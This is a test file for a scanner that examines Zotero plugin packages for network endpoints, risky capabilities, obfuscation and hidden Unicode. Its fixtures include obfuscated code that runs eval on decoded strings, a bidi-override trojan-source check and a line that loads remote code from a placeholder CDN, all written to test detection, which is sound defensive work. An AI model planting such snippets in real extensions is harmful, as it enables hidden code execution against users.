import { beforeAll, describe, expect, it } from "vitest";
import { analyzeXpi, type XpiEntry } from "../src/scan/analyze.ts";
import { classifyHost, type HostTable, loadHostTable } from "../src/scan/hosts.ts";
import { preview } from "../src/scan/preview.ts";
import { redactSecrets } from "../src/scan/text.ts";

let table: HostTable;
beforeAll(async () => {
  table = await loadHostTable();
});

const enc = new TextEncoder();
const manifest = (extra: Record<string, unknown> = {}) =>
  JSON.stringify({
    manifest_version: 2,
    name: "Fixture",
    version: "1.0.0",
    applications: {
      zotero: {
        id: "fixture@example.org",
        strict_min_version: "6.999",
        strict_max_version: "10.*",
        ...extra,
      },
    },
  });

function scan(files: Record<string, string>, manifestExtra?: Record<string, unknown>) {
  const entries: XpiEntry[] = [
    { path: "manifest.json", data: enc.encode(manifest(manifestExtra)) },
    ...Object.entries(files).map(([path, text]) => ({ path, data: enc.encode(text) })),
  ];
  const result = analyzeXpi({
    slug: "fixture",
    sha256: "a".repeat(64),
    entries,
    table,
    analyzedAt: "2026-09-25T00:00:00Z",
  });
  return { ...result, card: preview(result.analysis, result.updateHost) };
}

const host = (r: ReturnType<typeof scan>, name: string) =>
  r.analysis.network.hosts.find((h) => h.host === name);
const cap = (r: ReturnType<typeof scan>, id: string) =>
  r.analysis.capabilities.find((c) => c.id === id);

describe("host table", () => {
  it("classifies exact hosts, wildcards and bare IPs", () => {
    expect(classifyHost(table, "api.openai.com")?.category).toBe("llm-provider");
    expect(classifyHost(table, "1256272652-abc.ap-shanghai.tencentscf.com")?.category).toBe(
      "cloud-function",
    );
    expect(classifyHost(table, "124.156.114.124")).toEqual({
      category: "unknown",
      flags: ["ip-literal"],
    });
    expect(classifyHost(table, "192.168.1.5")?.category).toBe("localhost");
    expect(classifyHost(table, "www.w3.org")).toBeNull();
    // Plugins look titles up in Wikipedia: a reference service, not a help page.
    expect(classifyHost(table, "en.wikipedia.org")).toEqual({
      category: "scholarly-api",
      provider: "Wikipedia",
      flags: [],
    });
  });
});

describe("network", () => {
  it("separates requests from links", () => {
    const r = scan({
      "content/index.js": `
        async function ask(q) {
          const res = await fetch("https://api.openai.com/v1/chat/completions", { method: "POST", body: q });
          return res.json();
        }
        function help() { Zotero.launchURL("https://github.com/example/fixture#readme"); }`,
    });
    expect(host(r, "api.openai.com")).toMatchObject({
      usage: "request",
      category: "llm-provider",
      provider: "OpenAI",
    });
    expect(host(r, "github.com")?.usage).toBe("link");
    expect(r.analysis.network.apis.map((a) => a.api)).toEqual(["fetch"]);
    expect(r.card.dataSharing).toBe("named-third-parties");
  });

  it("follows a URL through one named constant into a request", () => {
    const r = scan({
      "content/index.js": `
        const DEEPL_ENDPOINT = "https://api-free.deepl.com/v2";
        function translate(text) { return Zotero.HTTP.request("POST", DEEPL_ENDPOINT + "/translate", { body: text }); }`,
    });
    expect(host(r, "api-free.deepl.com")?.usage).toBe("request");
    expect(r.analysis.network.dynamicUrls.map((d) => d.pattern)).toContain("<expr>/translate");
  });

  it("flags bare IP licence endpoints as unknown destinations", () => {
    const r = scan({
      "content/pro.js": `function activate(k) { return fetch("http://124.156.114.124:5000/v1/activate", { method: "POST", body: k }); }`,
    });
    expect(host(r, "124.156.114.124")).toMatchObject({
      port: 5000,
      flags: ["ip-literal", "unencrypted"],
      usage: "request",
    });
    expect(r.card.dataSharing).toBe("unknown-endpoints");
    expect(r.card.label).toBe("review-details");
  });

  it("reports no network access for a plugin without network code", () => {
    const r = scan({ "content/index.js": `Zotero.Items.getAll(1).then((items) => items.length);` });
    expect(r.card.dataSharing).toBe("no-network-found");
    expect(r.card.label).toBe("low-concern");
  });

  it("reads endpoints and credential prefs from prefs.js", () => {
    const r = scan({
      "prefs.js": `pref("extensions.fixture.apiKey", "");\npref("extensions.fixture.baseUrl", "https://api.deepseek.com/v1");`,
      "content/index.js": `const k = Zotero.Prefs.get("extensions.fixture.apiKey", true);`,
    });
    expect(r.analysis.network.configurableEndpoints).toMatchObject([
      { prefKey: "extensions.fixture.baseUrl", defaultValue: "https://api.deepseek.com/v1" },
    ]);
    expect(cap(r, "credential-storage")?.details?.prefKeys).toEqual(["extensions.fixture.apiKey"]);
  });
});

describe("transparency", () => {
  it("detects javascript-obfuscator output and eval over decoded strings", () => {
    const names = Array.from({ length: 60 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}`);
    const code = `
      var _0x4f2a = [${Array.from({ length: 40 }, (_, i) => `'s${i}'`).join(",")}];
      (function (_0x1f, _0x2e) { while (--_0x2e) { _0x1f['push'](_0x1f['shift']()); } })(_0x4f2a, 0x1f4);
      ${names.map((n, i) => `var ${n} = ${i};`).join("\n")}
      eval(atob(_0x4f2a[0]));`;
    const r = scan({ "content/index.js": code });
    const t = r.analysis.transparency;
    expect(t.verdict).toBe("obfuscated");
    expect(t.obfuscation.confidence).toBe("high");
    expect(t.obfuscation.signals.map((s) => s.kind)).toEqual(
      expect.arrayContaining(["hex-identifiers", "string-array-rotation", "eval-decoded-string"]),
    );
    expect(r.card.label).toBe("high-concern");
  });

  it("catches hidden Unicode runs and bidi controls, not single emoji selectors", () => {
    const hidden = "​".repeat(40);
    const r = scan({
      "content/a.js": `const payload = "${hidden}"; const warn = "⚠️ careful";`,
      "content/b.js": `const access = "user‮ ⁦// admin⁩";`,
    });
    const kinds = r.analysis.transparency.suspiciousUnicode.map((u) => u.kind);
    expect(kinds).toEqual(["bidi-control", "zero-width"]);
    expect(r.card.suspiciousUnicode).toBe(true);
  });

  it("attributes findings in bundled libraries to the library", () => {
    const r = scan({
      "content/index.js": `
// node_modules/fakelib/index.js
var lib = function () { return eval(arguments[0]); };
// src/index.ts
Zotero.debug("hello");`,
      "content/lib/pdf.worker.js": `var src = "https://mozilla.github.io/pdf.js/"; eval(src);`,
    });
    const dyn = cap(r, "dynamic-code");
    expect(dyn?.inVendoredCodeOnly).toBe(true);
    expect(r.analysis.transparency.vendoredLibraries.map((v) => v.name)).toEqual([
      "fakelib",
      "pdf.js",
    ]);
    expect(r.card.capabilities.find((c) => c.id === "dynamic-code")).toBeUndefined();
  });
});

describe("capabilities", () => {
  it("classifies database writes by table", () => {
    const r = scan({
      "content/index.js": `
        await Zotero.DB.queryAsync("INSERT INTO itemData (itemID, fieldID, valueID) VALUES (?, ?, ?)", [1, 2, 3]);
        await Zotero.DB.queryAsync("CREATE TABLE IF NOT EXISTS fixture_cache (k TEXT, v TEXT)");
        await Zotero.DB.queryAsync("SELECT * FROM items");`,
    });
    expect(cap(r, "db-write")?.details).toMatchObject({
      sqlStatements: ["CREATE", "INSERT"],
      sqlTables: ["fixture_cache", "itemData"],
    });
    expect(r.card.drivers).toContain("CAP-DB-WRITE-ZOTERO");
  });

  it("lists local HTTP server endpoints", () => {
    const r = scan({
      "content/index.js": `Zotero.Server.Endpoints["/fixture/cayw"] = CAYW; Zotero.Server.Endpoints["/fixture/export"] = Export;`,
    });
    expect(cap(r, "local-http-server")?.details?.endpoints).toEqual([
      "/fixture/cayw",
      "/fixture/export",
    ]);
  });

  it("flags process launching, remote code and network interception", () => {
    const r = scan({
      "content/index.js": `
        const p = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
        Services.scriptloader.loadSubScript("https://cdn.example.net/remote.js");
        Services.obs.addObserver(observer, "http-on-modify-request");`,
    });
    expect(r.analysis.capabilities.map((c) => c.id)).toEqual(
      expect.arrayContaining(["process-launch", "remote-code", "network-intercept"]),
    );
    expect(r.card.label).toBe("high-concern");
  });

  it("records the self-update host", () => {
    const r = scan(
      { "content/index.js": "" },
      { update_url: "https://updates.example-dev.net/update.json" },
    );
    expect(cap(r, "self-update")?.details?.updateUrl).toBe(
      "https://updates.example-dev.net/update.json",
    );
    expect(r.updateHost).toEqual({ host: "updates.example-dev.net", category: "unknown" });
  });

  it("falls back to regex scanning when a file doesn't parse", () => {
    const r = scan({
      "content/broken.js": `reader.onload(e) = function () {}; fetch("https://api.crossref.org/works");`,
    });
    expect(r.analysis.coverage.parseFailures).toHaveLength(1);
    expect(host(r, "api.crossref.org")?.category).toBe("scholarly-api");
  });
});

describe("false positives found in the first real scan", () => {
  it("does not treat ordinary queue code as string-array rotation", () => {
    const r = scan({ "content/parser.js": `while (stack.length) tokens.push(stack.shift());` });
    expect(r.analysis.transparency.obfuscation.signals).toEqual([]);
  });

  it("ignores bundler-escaped non-ASCII text but counts escaped ASCII", () => {
    const arabic = Array.from({ length: 200 }, () => '"\\u0627\\u0644\\u062A\\u0639"').join(",");
    const quiet = scan({ "content/i18n.js": `var t = [${arabic}];` });
    expect(quiet.analysis.transparency.obfuscation.signals).toEqual([]);
    const ascii = Array.from({ length: 200 }, () => '"\\x68\\x74\\x74\\x70"').join(",");
    const noisy = scan({ "content/o.js": `var t = [${ascii}];` });
    expect(noisy.analysis.transparency.obfuscation.signals.map((s) => s.kind)).toEqual([
      "escape-density",
    ]);
  });

  it("attributes code under indented esbuild markers to its package", () => {
    const r = scan({
      "content/index.js": `(() => {
  // ../node_modules/.pnpm/zotero-plugin-toolkit@4.1.2/node_modules/zotero-plugin-toolkit/dist/index.js
  var run = function (x) { return new Function(x); };
  // src/index.ts
  Zotero.debug("own code");
})();`,
    });
    expect(r.analysis.transparency.vendoredLibraries.map((v) => v.name)).toEqual([
      "zotero-plugin-toolkit",
    ]);
    expect(cap(r, "dynamic-code")?.inVendoredCodeOnly).toBe(true);
  });

  it("counts the toolkit's fixed osascript call as clipboard access, not launching programs", () => {
    const r = scan({
      "content/index.js":
        "if (this.filePath && Zotero.isMac) Zotero.Utilities.Internal.exec(`/usr/bin/osascript`, [`-e`, `set the clipboard to x`]);",
    });
    expect(cap(r, "process-launch")).toBeUndefined();
    expect(cap(r, "clipboard")?.details?.apis).toEqual(["osascript (fixed command)"]);
  });

  it("treats emoji subdivision flags as ordinary text", () => {
    const r = scan({
      "content/emoji.js": `const flags = ["🏴\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}"];`,
    });
    expect(r.analysis.transparency.suspiciousUnicode).toEqual([]);
  });

  it("reads endpoint paths registered through a helper", () => {
    const r = scan({
      "content/index.js": `
        class Server { register(path, h) { this.handlers[path] = h; } startup() { for (const [p, h] of Object.entries(this.handlers)) Zotero.Server.Endpoints[p] = h; } }
        server.register("/fixture/cayw", Handler);`,
    });
    expect(cap(r, "local-http-server")?.details?.endpoints).toEqual(["/fixture/cayw"]);
  });

  it("recognises the developer's own servers by name and add-on ID domain", async () => {
    const { developerHints, isDeveloperHost } = await import("../src/scan/analyze.ts");
    const hints = developerHints("AskYourPdf/zotero_plugin", "zotero@askyourpdf.com", null);
    expect(isDeveloperHost("auth-service.askyourpdf.com", hints)).toBe(true);
    expect(isDeveloperHost("api.openai.com", hints)).toBe(false);
    const byName = developerHints("wdcpclover/ai4paper", "ai4paper@github.com", null);
    expect(byName.domains).toEqual([]);
    expect(isDeveloperHost("ai4paper.pro", byName)).toBe(true);
    expect(isDeveloperHost("api.paper.com", byName)).toBe(false);
  });
});

describe("second-pass precision rules", () => {
  it("flags only direction overrides left open at the end of a line", () => {
    const balanced = scan({ "content/a.js": 'const rtl = "‫שלום‬"; const lone = "‬";' });
    expect(balanced.analysis.transparency.suspiciousUnicode).toEqual([]);
    const regex = scan({ "content/b.js": "const strip = /[‪-‮]/g;" });
    expect(regex.analysis.transparency.suspiciousUnicode).toEqual([]);
    const range = scan({
      "content/d.js": 'const re = new RegExp("[!-\\\\[\\u2027-\\u202a-\\ud7ff]");',
    });
    expect(range.analysis.transparency.suspiciousUnicode).toEqual([]);
    const table = scan({
      "content/e.js": 'const trie = "\\u2027\\u202a\\u202c\\u202e\\u8000\\u00bd\\u40bd";',
    });
    expect(table.analysis.transparency.suspiciousUnicode).toEqual([]);
    const trojan = scan({ "content/c.js": 'if (role !== "user‮") { admin(); }' });
    expect(trojan.analysis.transparency.suspiciousUnicode.map((u) => u.kind)).toEqual([
      "bidi-control",
    ]);
  });

  it("reports the table an index or trigger writes to", () => {
    const r = scan({
      "content/db.js": `Zotero.DB.queryAsync("CREATE UNIQUE INDEX IF NOT EXISTS idx_x ON fixture_notes (key)");`,
    });
    expect(cap(r, "db-write")?.details?.sqlTables).toEqual(["fixture_notes"]);
  });

  it("applies developer matching to the update host", async () => {
    const { analyzeXpi, developerHints } = await import("../src/scan/analyze.ts");
    const entries = [
      {
        path: "manifest.json",
        data: enc.encode(manifest({ update_url: "https://ai4paper.pro/update.json" })),
      },
    ];
    const r = analyzeXpi({
      slug: "fixture",
      sha256: "b".repeat(64),
      entries,
      table,
      developer: developerHints("wdcpclover/ai4paper", null, null),
    });
    expect(r.updateHost).toEqual({ host: "ai4paper.pro", category: "developer-server" });
  });

  it("treats files named like library releases as bundled", () => {
    const r = scan({
      "chrome/content/modules/excalidraw.production.min-0.16.1.js": "var x = eval(y);",
    });
    expect(r.analysis.transparency.vendoredLibraries.map((v) => v.name)).toEqual(["excalidraw"]);
  });

  it("ignores reserved placeholder hosts", () => {
    const r = scan({ "content/a.js": 'fetch("https://api.example.invalid/v1");' });
    expect(r.analysis.network.hosts).toEqual([]);
  });
});

describe("full-directory precision rules (analyzer 0.3.2)", () => {
  it("doesn't count writes to a plugin's own database file as Zotero's", () => {
    const own = scan({
      "content/a.js": `var DataBase = class extends Zotero.DBConnection {};
        this.DB = new DataBase(path);
        await this.DB.queryAsync("INSERT INTO settings (k, v) VALUES (?, ?)", [k, v]);`,
    });
    expect(cap(own, "db-write")).toBeUndefined();
    const zotero = scan({
      "content/a.js": `var DataBase = class extends Zotero.DBConnection {};
        await Zotero.DB.queryAsync("UPDATE items SET synced = 0 WHERE itemID = ?", [id]);`,
    });
    expect(cap(zotero, "db-write")?.details?.sqlTables).toEqual(["items"]);
    const alias = scan({
      "content/a.js": `this.DB = Zotero.DB; await this.DB.queryAsync("DELETE FROM collectionItems WHERE itemID = ?", [id]);`,
    });
    expect(cap(alias, "db-write")?.details?.sqlTables).toEqual(["collectionItems"]);
  });

  it("skips macOS resource forks and parses translators and XUL scripts", () => {
    const r = scan({
      "__MACOSX/content/._index.js": "\u0000\u0005\u0016\u0007 binary",
      "content/._helper.js": "\u0000\u0001",
      "translators/BibLaTeX.js": `{
\t"translatorID": "b6e39b57-8942-4d11-8259-342c46ce395f",
\t"label": "BibLaTeX"
}

function doExport() { Zotero.write("x"); }`,
      "content/prefs.xul": `<window><script><![CDATA[
        function init() { Zotero.debug("ready"); }
      ]]></script></window>`,
    });
    expect(r.analysis.coverage.parseFailures).toEqual([]);
    expect(r.analysis.coverage.filesSkipped.map((f) => f.path)).toEqual(
      expect.arrayContaining(["__MACOSX/content/._index.js", "content/._helper.js"]),
    );
  });
});

describe("evidence snippets never republish a hard-coded key", () => {
  it("redacts known key formats and long strings assigned to key-like names", () => {
    expect(redactSecrets('const k = "AIzaSyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";')).toBe(
      'const k = "[redacted key]";',
    );
    expect(
      redactSecrets('headers: { Authorization: "Bearer sk-Ab1Ab1Ab1Ab1Ab1Ab1Ab1Ab1Ab1Ab1Ab1Ab1" }'),
    ).toBe('headers: { Authorization: "Bearer [redacted key]" }');
    expect(redactSecrets('this.apiKey = \\"0123456789abcdef0123456789abcdef0123\\";')).toBe(
      'this.apiKey = \\"[redacted key]\\";',
    );
  });
  it("leaves ordinary code alone", () => {
    const code = 'fetch("https://api.openai.com/v1/chat/completions", { method: "POST" })';
    expect(redactSecrets(code)).toBe(code);
    expect(redactSecrets('getPref("apiKey")')).toBe('getPref("apiKey")');
  });
});
